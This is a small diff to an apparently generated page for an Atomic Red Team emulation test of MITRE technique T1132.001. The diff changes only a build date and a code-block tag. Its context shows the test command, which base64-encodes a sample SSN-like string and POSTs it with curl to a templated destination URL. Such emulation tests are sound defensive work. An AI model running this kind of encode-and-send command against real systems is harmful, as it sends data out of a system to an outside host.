@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1132.001"
 attack_technique_name: "Data Encoding: Standard Encoding"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25"
@@ -57,7 +57,7 @@ Utilizing a common technique for posting base64 encoded data.
 
 ### Command
 
-```sh
+```bash
 echo -n 111-11-1111 | base64
 curl -XPOST #{base64_data}.#{destination_url}
 ```
